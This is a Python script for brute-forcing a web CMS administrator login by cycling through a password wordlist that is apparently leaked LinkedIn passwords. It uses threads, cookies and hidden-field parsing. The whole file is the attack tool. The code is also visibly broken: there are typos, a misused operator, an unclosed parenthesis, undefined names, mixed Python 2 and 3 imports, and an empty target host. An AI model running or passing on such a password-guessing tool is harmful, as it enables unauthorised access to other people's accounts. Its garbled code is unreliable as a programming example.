import urllib.request
import urllib.error
import cookielib
import threading
import sys
from multiprocessing import Queue
from HTMLParser import HTMLParser

#general settings 
user_thread = 10
username = "admin"
wordlist_file="/Users/patrickharris/Desktop/linkedin_passwords.txt"
resume = None 

#specify target settings 
target_url = "http:///administrator/index.php"
target_post = "http:///administrator/index.php"

username_field= "username"
password_field = "passwd"

success_check = "Administration - Control Panel"

class Bruter(object):
	def __init__(self, username, words):

		self.username = username
		self.password_q = words 
		self.found = False

		print ("Finished setting up for: %s" % username)

	def run_bruteforce(self):

		for i in range(user_thread):
			t = threading.Thread(target=self.web_bruter)
			t.start()

	def web_bruter(self):

		while not self.password_q.empty() and not self.found:
			brute = self.password_q.get().rstrip()
			jar - cookielib.FileCookieJar("cookies")
			opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(jar))

			response = opener.open(target_url)

			page = response.read()

			print ("Trying: %s : %s (%d left)" % (self.username,brutee,self.password_q.qsize())

			#parse out the hidden fields 
			parser = bruteParser()
			parser.feed(page)

			post_tags = parser.tag_results 

			#add out username and password fields 
			post_tags[username_field] = self.username
			post_tags[password_field] = brute 

			login_data = urllib.request.urlencode(post_tags)
			login_response = opener.open(target_post, login_data)

			login_result = login.response.read()

			if success_check in login_result:
				self.found = True 
				print ("[*] Bruteforce successful.")
				print ("[*] Username: %s" % username)
				print ("[*] Password: %s" % brute)
				print ("[*] Waiting for other threads to exit...")

class BruteParser(HTMLParser):
		def __init__(self):
			HTMLParser.__init__(self)
			self.tag_results = {}

		def handle_starttag(self, tag, attrs):
			if tag == "input":
				tag_name = None
				tag_value = None 
				for name, value in attrs:
					if name == "name":
						tag_name = value
					if name =="value":
						tag_value = value

words = build_wordslist(wordlist_file)
bruter_obj = Bruter(username,words)
bruter_obj,run_bruteforce() 

		






